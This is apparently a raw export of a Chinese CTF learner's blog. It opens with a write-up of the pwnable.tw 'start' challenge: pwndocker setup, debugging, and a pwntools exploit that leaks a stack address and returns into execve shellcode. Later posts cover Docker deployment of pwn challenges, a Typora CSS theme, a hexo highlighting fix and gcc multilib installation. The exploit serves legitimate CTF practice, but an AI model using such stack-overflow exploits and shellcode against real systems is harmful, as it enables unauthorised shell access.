之前看到star大哥开始学pwn力，而且是使用的iterm+pwndocker的环境，觉得非常优雅，便一直想尝试一下，正好最近在研究docker的使用，可以拿来试一试。并且pwndocker也可以十分优雅地指定我们环境的glibc版本，所以是一个非常值得尝试的事。 2）pwndocker启动​ 首先是如何build pwndocker的问题。 ​ 如果直接docker pull pwndocker，速度一般会很慢。 ​ 这里参考一篇博客的做法：skysider/pwndocker 正确使用姿势。 ​ docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0从阿里云上拉取镜像，使得速度变快。 ​ 拉取完之后重命名镜像。docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker ​ 然后可以 docker run -d \\ --rm \\ -h ${ctf_name} \\ --name ${ctf_name} \\ -v $(pwd)/${ctf_name}:/ctf/work \\ -p 23946:23946 \\ --cap-add=SYS_PTRACE \\ pwndocker ​ 运行镜像。 ​ 但是比较奇怪的是我使用这些指令运行容器并不成功，但是使用 docker run -it skysider/pwndocker /bin/bash是能够进入容器并交互的，检查了一下一些环境也比较完善，但是并没有可以操作的二进制文件。 ​ ​ 我们可以先用docker cp来将题目的文件拷贝至容器中。 ​ ​ 关于docker cp指令这里，因为不太熟悉docker的基础指令，掉到坑中绕了一会儿。 ​ 如果我们需要将我们的二进制文件cp到容器中，需要指定容器的pid，但是如果是通过docker run指令并加上参数进入容器内的话，每次执行这个指令，就相当于通过镜像重新创建了一个容器，pid就会变化，所以这样操作肯定行不通。所以我们先创建一个容器，然后copy它的pid，cp文件以后，通过docker start和docker attach来进入容器就行。 ​ 愉快的gdb时间（（ ​ 还要解决的就是容器与主机交互的问题，毕竟脚本啥还是要用图形化的写比较开心。 ​ 然后是做题时间。 ​ 这个题尤其基础，直接溢出0x20个字符就行，ret2shellcode。 ​ ​ ps：关于cyclic的原理可以看我的pwntools源码解析系列。 ​ 然后还是得解决主机和容器之间的信息交互，如何优雅地将主机写的脚本传进docker捏 。 ​ 还是要借助docker run的- v参数，大概就是~/work/pwner:/ctf/work ​ 但是比较离谱的就是copy了文件夹以后，似乎并不能立即在容器中看到，我重启之后才有效果。难道每次修改脚本都需要重启容器吗？ ​ 后来重启一次之后就能立即同步到容器中了。好。 ​ 有一点离谱。 ​ 虽然但是，我超，pwndokcer真的好用。 ​ 鉴于我以前做过这道题，而且那时候的wp写得非常离谱，我决定重新写一遍。具体有多离谱，大概就是全程只有寻找偏移量的描述，然后exp是复制别人的。写了，但是没完全写（ ​ 所以偏移量的寻找我就懒得写了，cyclic一把梭。并且由于cyclic是直接覆盖掉了返回地址的eip的（这也是cyclic能找到偏移量的道理所在），这个得出来的0x20也不需要加什么ebp，直接0x20+任意地址了事。 ​ 然后就是显然的一个任意地址执行。并且喜闻乐见的NX也没有开启，直接ret2shellcode，把shellcode一股脑丢到栈上执行就行。 ​ shellcode就没必要手写了，pwntools.shallcraft直接生成。 from pwn import* p = remote('chall.pwnable.tw',10000) shellcode = asm(shellcraft.sh()) payload = b'a'*20 payload += shellcode p.send(payload) p.interactive() ​ 摸了一圈，又EOF力。 ​ 换了祖传exp。 from pwn import* p = remote(\"chall.pwnable.tw\",10000) #p = process(\"./start\") #shellcode = asm(shellcraft.sh()) shellcode = b'\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80' buf_addr = 0xffffd284 payload = b'a'*0x14 payload += p32(0x8048087) p.sendafter(\"Let's start the CTF:\",payload) stack_addr = u32(p.recv(4)) print(hex(stack_addr)) payload = b'a'*20 payload += p32(stack_addr+20) payload += shellcode p.send(payload) p.interactive() ​ 所以shellcode是没有问题的，问题出在需要溢出两次，一次获得栈地址，一次ret到栈地址执行shellcode。我不能理解。 ​ shellcode覆盖retn，不也是在栈上执行吗，为什么EOF。我猜测是栈空间不够大。虽然但是，不想找wp，喜闻乐见地调试一下吧。 ​ 在调试的时候又出现了新问题。 ​ 搜了一圈应该是启动tmux的问题。但是网上给的解决方案在我这里似乎不管用。 ​ 在研究tumx的时候发现了一个更离谱的事，这个pwndocker的系统时间是错误的。导致apt都运行不了。 ​ 这就造成了一个非常离谱的死循环，修复时间需要使用apt安装相关的软件，然而时间又导致apt无法运行。 ​ 虽然但是，解决方法也比较弱智。把https改成http是最粗暴的解决方案了，但是有一说一，这不优雅。但是最后还是妥协了，先用http下了一个ntp，然而发现就算是系统时间校准了，换回https后还是现实证书不被信任。。。 ​ 这里留个疑点吧。 ​ 还是回到题目本身。也就是无法gdb.attach()的问题。 ​ 原来是因为要先输入tmux进入，才能执行分屏。。。。。。。。 ​ 我傻了。坑是真的多。 ​ 果然碰到了无限waiting for debug的问题，虽然pwntools是4.6.1了。 ​ 在修改源码后解决问题，详情可以参考：pwntools中使用tmux和gdb attach时Waiting for debugger无限等待的解决方案。 ​ 解决问题的过程中又发现了一个问题，就是我打开tmux的时候突然就风扇狂转，CPU占用率直接飙到109%，内存3.53G。我以为是容器开太多的问题，把多余的容器全部rm，但是还是不见缓解。 ​ 百度后发现这个好像是MAC运行Docker的通病，但是我这个容器至少不应该是这样，因为之前风扇一直就没怎么转，于是我把我现在运行的容器停止，结果cpu占用率一下就变低了，然后再重启，cpu占用率再也没有升高。 ​ 对于这个情况我的合理猜测是，那个pwntools源码的无限循环问题。 ​ ​ ​ 尝试了一下一种新的下断点方式。 ​ 回到题目，很显然如果摁执行shellcode，就根本没有反应（（ ​ eip也没有被覆盖。之前的猜测是栈空间不够，这里来验证一下。 ​ 新问题，如果调试的话terminal中tmux的选项似乎只能指定splitw，但是这样就没有办法滚动。。。 ​ 好，解决了。首先可以通过按ctrl+b后再按[，切换到查看另一个窗口的历史输出模式，然后将终端中的偏好设置里的“滚动备用屏幕”取消勾选（其实默认应该是不勾的） ​ 这样我们的操作逻辑就是Fn/shift加鼠标滚轮滚动页面，普通的鼠标滚轮则选择历史输入，然后 ctrl+b后再按[，可以用鼠标滚轮控制光标查看历史输出。 ​ (真有够麻烦的) 3）漏洞利用 ​ 看一下发现不对头，这个返回地址是我们的shellcode。 ​ 按照我的想法，指令应该继续执行下去的，因为堆栈可执行。但是实际上并没有执行，而是把shellcode识别成了返回地址。 ​ 然后我才意识到一直以来我对栈溢出其实是有一些理解上的错误的，retn这个操作码无论如何是不能够被覆盖的，覆盖的只有后面的操作数。所以这里我们需要让程序先retn到一个合法的地址，然后后面跟着shellcode。 ​ 那么我们要retn到哪里呢？ ​ 既然堆栈可执行，那就直接跳到栈上好了。所以此刻我们需要一个栈上的地址。 ​ 既然需要泄露内存，肯定就需要有类似功能的函数，非常清明地，我们能够利用sys_write 对栈上内存进行一个读取。 ​ 那么如何利用捏。 ​ 从这里我们可以清楚地看到，这几条指令分别设置了sys_write的参数，真正的参数实际上是字符串“lets start the ctf”，但是我们这里只需要这四条指令。 ​ mov ecx, esp将当前栈顶的值赋给ecx，作为函数输出的东西的参数。其他的参数这里我们不必关心。 ​ ![截屏2021-11-04 下午10.13.28](/Users/rin/Library/Application Support/typora-user-images/截屏2021-11-04 下午10.13.28.png) ​ 其实从第一个执行流的ret开始前，清栈已经完成，此时栈顶是下一条需要执行的指令的地址，后面就都是栈上的一些环境变量。 ​ 当我们的程序执行流回到0x8048087。被write出来的其实就是栈顶的地址。 ​ 这时候程序还是会按照原有的指令执行，比如说下一个sys_read函数。 ​ 这时候并没有任何栈指针的操作，以至于esp的值很久没有变过。但是这里没有必要在意，直接第二次栈溢出。这里我们retn的地方就是刚刚获得的栈地址。但是因为我们已经输入了0x20个字符，所以需要stack_addr+20。（从动调中我们能够看出，sys_read会对栈指针进行操作，也就是把输入的每一个A压栈，这样我们原先的地址需要+20） ​ 然后直接溢出到栈地址。 ​ 执行shellcode ​ hhx 4）总结​ 这道题以前做过。但是那个时候我还是个啥也不懂只会抄wp的傻子。那个时候基本问啥啥不懂，现在已经能完全通过exp将不理解的地方通过动调明确了。 ​ 动调真的只用了不到半个小时，今天有五分之四的时间都在调教pwndocker的环境。用pwndocker来做真的非常优雅而且方便，我以后真的要舍弃pd力！！！！ ​ 另外容器要记得及时备份55. ​ 还有就是经常出现挂载文件夹不同步的问题，这个应该是docker本身存在一些bug，重启以后基本能够解决。 ​","categories":[],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"基于ctf pwn环境的docker搭建","slug":"基于ctf pwn环境的docker配置","date":"2021-10-31T15:04:01.604Z","updated":"2021-11-17T15:14:08.581Z","comments":true,"path":"2021/10/31/基于ctf pwn环境的docker配置/","link":"","permalink":"https://fuurinko.github.io/2021/10/31/%E5%9F%BA%E4%BA%8Ectf%20pwn%E7%8E%AF%E5%A2%83%E7%9A%84docker%E9%85%8D%E7%BD%AE/","excerpt":"","text":"​ 最近为了校内的萌新赛，需要出一些简单的pwn题，然后把它们搓进docker。虽然步骤并不是非常复杂，而且有现成的框架，但我发现如果纯粹按照网上框架的一件脚本运行的话，遇到报错根本无法解决，所以看图说话之外我还需要较为系统地学习docker知识。 docker基础架构​ 对于docker，在了解基础命令之前我们需要了解的就是，容器以及虚拟化的大致概念。 1.1 为什么要有docker？​ 一个程序运行也许需要严苛的环境条件，也许一个微小的环境变量的差异，将导致程序的崩溃，因此在软件开发的过程中，统一环境是一件很重要的事。 ​ 为了解决这个问题，我们可以使用虚拟机，将程序同操作系统一起打包，这样确实避免了因为环境问题导致的程序的bug。 ​ 但是虚拟机通常体积庞大，且启动时间缓慢，资源占用多。所以相比于纯粹使用虚拟机，我们希望使用一些更轻盈的虚拟化工具来解决问题。而容器化技术应运而生，也就是Linux 容器（Linux Containers）。 ​ linux容器并不是完整的操作系统，容器化对进程隔离，使得不同的容器共享内核，但是调用的各种资源是虚拟的。容器化就像在正常的进程外伪装了一层外壳，使得壳内的进程认为自己是在一个全新的环境中运行，所以很自然的，容器中的应用启动速度快，资源占用少，并且体积轻巧。 ​ 而Docker的存在为我们提供了Linux容器的封装,提供简单易用的容器使用接口。它是目前最流行的 Linux 容器解决方案。 1.2 docker基础知识​ 之前说到，Docker提供了Linux容器的封装，运用Docker实现容器化也十分简单，我们只需要有image文件，再通过docker创建镜像的容器，就能够在容器中运行我们想要的程序。 ​ image文件，顾名思义，类似系统iso，它包含应用程序以及运行它所必需的依赖，Docker通过image文件生成一个个运行的容器。实际开发中，一个 image 文件往往通过继承另一个 image 文件，加上一些个性化设置而生成。举例来说，你可以在 Ubuntu 的 image 基础上，往里面加入 Apache 服务器，形成你的 image。 1.3 docker基础命令​ 首先我们需要拉取镜像至本地，可以通过docker pull命令。例如： $ docker image pull library/hello-world ​ ​ 拉取镜像需要一定时间的等待，拉取完成后，通过docker image ls可以查看本地的docker镜像。 ​ ​ 这个hello world其实就是被打包好的在特定环境下的程序，我们可以通过docker cantainer run hello-world指令将镜像创建为容器并运行。 docker build​ build指令使用dockerfile来创建新的容器。一般来说简单的构建命令就是 $ docker build -t imagename . ​ 虽然我不是很理解这个-t 的参数意义何在，并且镜像名后面的“.”是干啥的。 docker run​ 创建一个新的容器并运行 ​ 一般来说会有这几个参数 -d: 后台运行容器，并返回容器ID； -it: 以交互模式运行容器，并创建一个伪终端； -p: 指定端口映射，格式为：主机(宿主)端口:容器端口 --name=\"nginx-lb\": 为容器指定一个名称； -v：映射主机文件夹至容器内 docker start/stop/retart​ 启动或停止容器。 ​ 指令为docker start/stop/retart containerID docker pause​ 暂停容器内全部进程。 docker kill​ kill 运行的容器进程 docker ps​ 列出容器。 -a :显示所有的容器，包括未运行的。 docker attach​ 连接到正在运行中的容器。 docker attach containerID docker inspect​ 获取容器/镜像的元数据。 简单的docker搭建步骤​ 熟悉docker基础操作后，开始搭建docker啦！！ ​ 首先是脚本的选择，pwn的docker脚本其实很多，这里随便选一个最基础的ctf_xinted。 ​ 首先我们需要做的是把项目clone到本地。 ​ 通过指令cat Dockerfile可以看到dockerfile。 ​ dockerfile是用来构建docker镜像的，里面包含了构建docker镜像构建的一些步骤和说明。一般来说如果要打包自己的环境的话，需要写dockerfile来供别人使用。这里我们直接切换到ctf_xinetd的文件夹下，然后执行 sudo docker build -t \"helloworld\" . ​ (注意后面的“.”) ​ 这个时候一般就会创建helloworld这个镜像，我们只需要等待创建结束，然后执行 sudo docker run -d -p \"0.0.0.0:10001:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld ​ 0.0.0.0表示用户连接的ip地址，10001表示对用户开放的端口，9999指容器内部端口绑定到指定的主机端口。 ​ 如果运行正常，此时我们是能够通过 nc 0.0.0.0 10001来连接我们的docker容器的。 ​ 但是有时候docker会出现一些问题。比如说在创建镜像的时候有可能会出现软件源解释失败的问题，这时候你需要关闭你的vpn（如果有）。然后重启docker。就像这样 sudo service docker restart ​ 这样这个pwn题的docker就算部署完成了，你只需要把你自己的题目放置在容器中，并修改对应的flag就行。 ​ 但是目前来说这个框架存在一些局限性，比如说一次只能部署一道题等。 ​ 所以我们可以更换另外一个脚本进行docker镜像的创建。 ​ 这里我们选择https://github.com/giantbranch/pwn_deploy_chroot.git，这个脚本。 ​ 然后有个比较全面的教程，链接在这里：如何安全快速地部署多道ctf%20pwn比赛题目 ​ 就是把文件放到bin文件夹，然后 python initialize.py docker-compose up --build -d # please run as root ​ 这样就生成了一个总的镜像，每道题通过不同端口映射，然后分别有各自的flag。 ​ 在完成镜像的创建后，还需要在做题平台中填写相关镜像。 ​ 因为我们的CTFd是二次开发的，一般的CTFd的题目分类是有个dynamic docker，但是我们的平台只有一个kube类型。但是里面的东西还是八九不离十，然后对于指定题目，你需要填写你的docker image。并且指定暴露端口。 ​ 然后我这个萌新就被狠狠地坑了，一开始费了好大劲从0学习docker（虽然不难），然后通过别人的框架部署题目，创建好镜像，照猫画虎指定ip和端口运行容器，最后打开CTFd，就直接把docker image那一空给填成自己启动容器的那串ip了，然后端口也傻傻地不知道怎么搞，然后随便乱输一通，结果狠狠地靶机notready了。 ​ 直到下午我突然意识到哪里不对，然后去搜了一下，发现别人填的和我填的好像不太一样，找胖爷爷确认了一下，果然是要填docker hub里的镜像名哇。 ​ 然后又狠狠地push了镜像，在CTFd填了镜像的名字，然后端口就是初始化时每个二进制文件对应的那个映射的端口，这下总算靶机ready了。并且顺利通过测试。 ​ 好！ ​ ​ ​ 参考Docker 入门教程 Docker 镜像使用 ​ ​","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"typora主题配置的一些心得","slug":"typora主题配置的一些心得","date":"2021-10-29T15:20:57.419Z","updated":"2021-10-30T07:22:18.232Z","comments":true,"path":"2021/10/29/typora主题配置的一些心得/","link":"","permalink":"https://fuurinko.github.io/2021/10/29/typora%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/","excerpt":"","text":"![触控栏快照2021-10-29 下午11.50.07](/Users/rin/Desktop/触控栏快照2021-10-29 下午11.50.07.png) 1）​ 由于看腻了typora原主题的python高亮的丑兮兮的屎黄色注释，决定换个主题。然而找遍整个主题列表，并没有我看得上的主题。本来打算作罢，但想起最近因为写小程序，学了一些简单的css，是不是可以尝试一下修改某些主题的css文件，打造一个自己喜欢的主题捏。 2）​ 在下载主题的过程中我大致了解了一下typora主题开发的大致内容，其实主体感觉就是css（除了css，就是各种需要的字体。 ​ 这里以主题mint为例，css中:root元素声明了全局css变量，如下： :root { --side-bar-bg-color: #ffffff;//边栏颜色 --control-text-color: #6B6B6B;//边栏文件未选中字体颜色 --active-file-bg-color: #ecf6f2;//边栏文件背景颜色 --active-file-border-color: #6B6B6B;//不清楚是个啥 --active-file-text-color: #202020;//边栏文件选中后字体颜色 --table-even-row-color:#f8fcfa;//不清楚是个啥 --table-head-color:#d9ede5;//不清楚是个啥 --deep-theme-color: #c2e2d5;//深色模式主题色 --code-block-bg-color: #0F111A;//代码块字体颜色以及代码块边框颜色 } ​ 所以如果想修改各种配色，只需要修改对应颜色的hex就行。 ​ 这个比较难搞的是猜测各种元素对应的含义（（需要手动去尝试。但是就算是这样还是有几个元素没有试出来到底是哪一块的配色，似乎typora也没有类似的官方文档来规定每个div的名字（（ ​ 然后需要修改的是代码高亮的一些相关配色，typora的代码高亮是直接用的css而不是引用highlight.js（感觉也差不多233）。 ​ 然后我们找到代码高亮的css元素（其他的基本都是字体以及留白的一些样式，没有需求可以不用管）,找到对应的元素就可以开始魔改（ ​ (ps:感觉typora还有很多主题的方法可以使用，比如说backgroud = url（），通过这个 插入图片等，但是好像并没有找到类似的文档，我也不想再切图，于是作罢) ​ 其实魔改以后感觉变化也不是特别大，但是魔改的过程还是很有意思。 ​ 顺便附上它的css :root { --side-bar-bg-color: #ffffff; --control-text-color: #424242; --active-file-bg-color: #ffffff; --active-file-border-color: #6B6B6B; --active-file-text-color: #7eadad; --table-even-row-color:#555555; --table-head-color:#7a7979; --deep-theme-color: #343a41; --code-block-bg-color: #292424; } /*serif*/ @font-face { font-family: 'Lexend'; font-weight: normal; font-style: normal; src: url('./mint/Lexend-Regular.ttf') } @font-face { font-family: 'Lexend'; font-weight: bold; font-style: normal; src: url('./mint/Lexend-Bold.ttf') } /*monospace*/ @font-face { font-family: 'SourceCodePro'; font-weight: normal; font-style: normal; src: local(SourceCodePro), url('./mint/SourceCodePro-Regular.ttf') } /*Chinese*/ @font-face { font-family: 'NotoSansSC'; font-weight: normal; font-style: normal; src: url('./mint/NotoSansSC-Regular.otf') } @font-face { font-family: 'NotoSansSC'; font-weight: bold; font-style: normal; src: url('./mint/NotoSansSC-Bold.otf') } html{ font-size: 16px; } body { font-family: 'Lexend','SourceCodePro','NotoSansSC'; font-weight: normal; line-height: 1.5rem; letter-spacing: 0; margin: 0; } #write { max-width: 900px; padding: 30px 50px 20px; } #write p{ text-align:left; } #write pre.md-meta-block { padding: 1rem; font-size: 85%; line-height: 1.45; background-color: #ffffff; border: 0; border-radius: 3px; color: #141414; margin-top: 0 !important; } .md-image&gt;.md-meta { color: #141414; font-size: 0.9rem; font-family: 'Lexend'; padding: 4px 0; } @media print { html,body { font-size: 14px; } table, pre { page-break-inside: avoid; } pre { word-wrap: break-word; } } @page { size: A4; margin: 8mm 0mm; } /*toc*/ .md-toc { margin-top:20px; padding-bottom:20px; color: var(--deep-theme-color); } a { color: var(--deep-theme-color); text-decoration: none; } a:hover { text-decoration: underline; } /*headers*/ h1,h2,h3,h4,h5,h6 { display: block; font-weight:bold; } h1 { font-size: 2em; margin-top: 0.67em; margin-bottom: 0.67em; } h2 { font-size: 1.5em; margin-top: 0.83em; margin-bottom: 0.83em; } h3 { font-size: 1.17em; margin-top: 1em; margin-bottom: 1em; } h4 { font-size: 1em; margin-top: 1.33em; margin-bottom: 1.33em; } h5 { font-size: 1em; margin-top: 1.33em; margin-bottom: 1.33em; color: #777777; } h6 { font-size: 1em; margin-top: 1.33em; margin-bottom: 1.33em; color: #adadad; } p, blockquote, ul, ol, dl, table { margin: 0.8rem 0; } /*table*/ table { border-collapse: collapse; padding: 0; word-break: initial; table-layout: fixed; width: 100%; } table tr:nth-child(even){ background-color: var(--table-even-row-color); } thead{ background-color: var(--table-head-color); } table th{ text-align: center; padding:6px 13px; border: 1px solid var(--table-head-color); } table td{ padding:6px 13px; border: 1px solid var(--table-head-color); } table tr{ padding:6px 13px; border: 1px solid var(--table-head-color); } /*blockquote*/ blockquote { border-left: 0.2rem solid var(--side-bar-bg-color); color: #b4d8e9; font-family: 'Lexend','NotoSansSC'; font-size: 0.9rem; padding-left: 2rem; } /*list*/ li p.first { display: inline-block; } ul, ol { padding-left: 30px; } ul:first-child, ol:first-child { margin-top: 0; } ul:last-child, ol:last-child { margin-bottom: 0; } .md-task-list-item:hover &gt; input:before, input[type='checkbox']:hover:before { opacity: 1; transition: 0.5s; background-color: var(--side-bar-bg-color); } .task-list-item input::before { content: \"\"; display: inline-block; border-radius: 1.1rem; vertical-align: middle; border: 1.2px solid var(--deep-theme-color); background-color: #ffffff; width: 1.1rem; height: 1.1rem; margin-left: -0.1rem; margin-right: 0.1rem; margin-top: -0.68rem; } .task-list-item input:checked::before { padding-left: 0.125em; content: '✔'; color:white; background-color: var(--deep-theme-color); font-size: 0.8rem; line-height: 0.95rem; margin-top: -0.68rem; transition: background-color 200ms ease-in-out; } .task-list-done { text-decoration: line-through; color: #343a41; } hr { border-style: none; border-top-style: solid; border-color: #e7e7e7; border-width: 1px; margin: 2rem 0; } /*highlight*/ #write mark { background-color: #c7ffe8; border-radius: 2px; color: rgb(44, 39, 39); padding: 0 4px; margin: 0 2px; } /*inline code*/ #write code,tt { padding: 0.6px 4px; border-radius: 2px; background-color: rgba(238, 238, 238, 0.39); font-family: 'SourceCodePro',Consolas,Courier, Monospace; font-size: 0.9rem; color: #666666; margin: 0 2px; } /*footnote*/ #write .md-footnote { color: #343a41; background-color: #e4e4e4; } /*source code mode*/ .cm-s-typora-default .cm-header { color: #524a4a; } .cm-s-typora-default .cm-link { color:var(--deep-theme-color); } /*code block*/ #write .md-fences { font-size: 1rem; margin: 0.2em 0; padding: 0.5em; border-radius: 3px; font-size: 0.9em; font-family: 'SourceCodePro',Consolas,Courier, Monospace ; background-color: #fffdfd; color: #a3a3a3; border: none; text-shadow: none; } .md-fences .code-tooltip { background-color: #ffffff; } /* Name: material-ocean Author: Mattia Astorino (http://github.com/equinusocio) Website: https://material-theme.site/ */ .cm-s-inner.CodeMirror { background-color: #ffffff; color: #343a41; } /*.cm-s-inner .CodeMirror-gutters { background: #ffffff; color: #ffffff; border: none; } */ .cm-s-inner .CodeMirror-linenumber {color: #343a41;} .cm-s-inner .CodeMirror-guttermarker { color: #FFEE80; } .cm-s-inner .CodeMirror-guttermarker-subtle { color: #D0D0D0; } /* .cm-s-inner .CodeMirror-cursor { border-left: 1px solid #FFCC00; } .cm-s-inner.cm-fat-cursor .CodeMirror-cursor { background-color: #FFCC00 !important; } .cm-s-inner .cm-animate-fat-cursor { background-color: #FFCC00 !important; } */ .cm-s-inner .CodeMirror-cursor { border-left: 1px solid #A9B7C6; } .cm-s-inner div.CodeMirror-cursor { border-left: 1px solid #ffffff; } .cm-s-inner div.CodeMirror-selected { background: rgba(58, 58, 59, 0.2); } .cm-s-inner.CodeMirror-focused div.CodeMirror-selected { background: rgba(221, 224, 241, 0.2); } .cm-s-inner .CodeMirror-selected{ background: #d6dce7 !important; } .cm-s-inner .CodeMirror-selectedtext { background: #dbdee6 !important; } .cm-overlay.CodeMirror-selectedtext { background: #B5D6FC !important; } .cm-s-inner .CodeMirror-line::selection, .cm-s-inner .CodeMirror-line&gt;span::selection, .cm-s-inner .CodeMirror-line&gt;span&gt;span::selection { background: rgba(221, 224, 241, 0.2); } .cm-s-inner .CodeMirror-line::-moz-selection, .cm-s-inner .CodeMirror-line&gt;span::-moz-selection, .cm-s-inner .CodeMirror-line&gt;span&gt;span::-moz-selection { background: rgba(221, 224, 241, 0.2); } .cm-s-inner .CodeMirror-activeline-background { background: #ffffff; } .cm-s-inner .cm-keyword { color: #8979c0; } .cm-s-inner .cm-operator { color: #25c494; } .cm-s-inner .cm-variable-2 { color: #4f5481; } .cm-s-inner .cm-variable-3, .cm-s-inner .cm-type { color: #f84f57; } .cm-s-inner .cm-builtin { color: #eca622; } .cm-s-inner .cm-atom { color: #F78C6C; } .cm-s-inner .cm-number { color: #ad7a83; } .cm-s-inner .cm-def { color: #82AAFF; } .cm-s-inner .cm-string { color: #70be26; } .cm-s-inner .cm-string-2 { color: #7a232e; } .cm-s-inner .cm-comment { color: #3a4677; } .cm-s-inner .cm-variable { color: #bb584b; } .cm-s-inner .cm-tag { color: #b44457; } .cm-s-inner .cm-meta { color: #b9b717; } .cm-s-inner .cm-attribute { color: #71498a; } .cm-s-inner .cm-property { color: #a075be; } .cm-s-inner .cm-qualifier { color: #f8ce11; } .cm-s-inner .cm-variable-3, .cm-s-inner .cm-type { color: #fce470; } .cm-s-inner .cm-error { color: rgba(255, 255, 255, 1.0); background-color: #FF5370; } .cm-s-inner .CodeMirror-matchingbracket { text-decoration: underline; color: white !important; }","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"解决hexo无法显示高亮问题","slug":"解决hexo无法显示高亮问题","date":"2021-10-28T08:13:26.358Z","updated":"2021-10-29T05:59:54.758Z","comments":true,"path":"2021/10/28/解决hexo无法显示高亮问题/","link":"","permalink":"https://fuurinko.github.io/2021/10/28/%E8%A7%A3%E5%86%B3hexo%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E9%AB%98%E4%BA%AE%E9%97%AE%E9%A2%98/","excerpt":"","text":"​ 博客搭了有快一年了，一直是hexo+git page的配置（不过这个搭配现在绝版了2333），但是一直荒废着，差不多到大一暑假的时候才想起要好好经营。 ​ 但是代码高亮这个一直没有解决。 ​ 之前我以为是博客主题配置的问题（就是highlight对象的值的问题），但是无论用怎么样的方法都不太行。 ​ 在研究代码高亮的过程中，我才知道原来有个项目叫highlight.js,里面有各种各样的代码高亮的css文件。 ​ 一开始我是将博客原本的代码高亮的css文件替换成我想要的样式，但是无论替换成什么样式，博客中代码都是蓝色，清一色的蓝色。然后我意识到，这根本不是什么代码高亮的样式，这根本就是，没有代码高亮。 ​ 然后我开始在网上寻找解决方案，搜索的关键词是hexo 无法显示代码高亮，辗转来回，找到了一篇文章。 ​ hexo中highlight.js代码高亮的修改方法 ​ 按照文章中的方法，我在主题layout文件夹中的_post.ejs文件随便找了个角落，把 COPY&lt;!-- Highlight.js --&gt; &lt;link rel=\"stylesheet\" href=\"//highlightjs.org/static/demo/styles/night-owl.css\"&gt; &lt;script src=\"//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js\"&gt; &lt;/script&gt; &lt;script&gt; hljs.initHighlightingOnLoad(); &lt;/script 丢了进去。 ​ 然后我的博客就成功的显示了代码高亮。 ​ 这样看其实看不出什么端倪，具体功能的实现还是要看脚本的内容，但是估计我也看不懂（）。 ​","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"解决gcc无法编译32位程序的问题","slug":"解决gcc无法编译32位程序的问题","date":"2021-10-27T12:26:56.705Z","updated":"2021-10-29T05:59:42.130Z","comments":true,"path":"2021/10/27/解决gcc无法编译32位程序的问题/","link":"","permalink":"https://fuurinko.github.io/2021/10/27/%E8%A7%A3%E5%86%B3gcc%E6%97%A0%E6%B3%95%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"","text":"1）前言​ 之前一直被gcc无法编译32位程序而困扰，但是问题一直拖着没有解决，趁着今天比较闲，把这个问题彻底解决一下。 2)过程​ 首先我们尝试编译32位程序，gcc报错： ​ 缺少头文件，实则是没有安装多架构gcc。 ​ 试图安装，失败，报错如下： ​ 这里有个坑了我好久的东西，就是这个报错 E: Unable to correct problems, you have held broken packages. ​ 无法修正问题，你持有held broken的软件包。 ​ 我一直没有理解正确这个held的意思，我以为是持有的意思，所以一直以来这句话在我眼中的意思是，你已经有这个软件包了，但是你不能安装。 ​ 但实际上，但凡熟悉过apt或者dkpg的一些命令，或者但凡对linux文件系统稍微熟悉一点都知道其实hold是为了防止更新不想更新的软件包，而特殊设置的功能。通过apt- mark或者dpkg命令 ，从apt-get中将特定的软件包的更新排除。而这道题的报错就是源于这点–gcc-7-multilib等依赖的软件包版本不对，但是由于held，所以并没有被更新。 ​ 但是通过dpkg --get-selections | grep hold指令查找held的软件包，并没有任何结果。 ​ 经过各种试错，找到了一个快速解决的方法。 sudo aptitude install gcc-multilib aptitude与apt类似，也是包管理器。但是通过aptitude进行包管理，对于软件包依赖问题的处理更加细节。 ​ 下面是一些常用的命令 aptitude update #更新可用的包列表 aptitude purge &lt;pkgname&gt; #删除包及其配置文件 aptitude search &lt;pkgname&gt; #搜索包 aptitude clean #删除下载的包文件 aptitude autoclean #删除过期的包文件 aptitude执行起来和apt其实不太一样，比如 sudo aptitude install gcc-multilib 这个命令其实执行起来长这样： ​ 然后aptitude会问你 ​ 这里是最大的坑。如果是像我这种不想看英文按照习惯输Y的人，这里会踩一个大坑。 ​ 明确地告诉了我： The following actions will resolve these dependencies: Keep the following packages at their current version: ... ... ... Accept this solution? [Y/n/q/?] 保持下面软件包的版本不变，你接受这个解决方式吗？ 显然我不接受，只要摁下N，问题就解决了。 然后。自动执行gdb-multilib的安装。 问题解决。 3）总结​ 这个问题回过头来想，其实非常简单，如果清楚问题所在的话，只需要一行命令就能解决。当然并不是每个人都经验丰富，但是没有经验，可以积累经验，然而在积累的过程中，有些愚蠢的错误确实是不应该犯的。比如说，不认真看报错信息，或者提示，凭着感觉装。这是我在处理这种问题上最大的弱点。 ​ 一个原因是我骄傲自满了，我确实认为在这一步不会出错，但是实际上问题就是发生在这一步上，另外就是，全英文的屏显，没有人愿意仔细阅读，但是这点没有办法，绝对不可能调成中文，这里只能是说，慢慢看，仔细看 ，然后提升一下英语水平。（但是有一说一，英语母语的人可能都不愿意看吧） 4）参考【Ubuntu】aptitude命令详解 Unable to correct problems, you have held broken packages","categories":[],"tags":[{"name":"linux primary","slug":"linux-primary","permalink":"https://fuurinko.github.io/tags/linux-primary/"}]},{"title":"格式化字符串偏移计算原理及pwntools 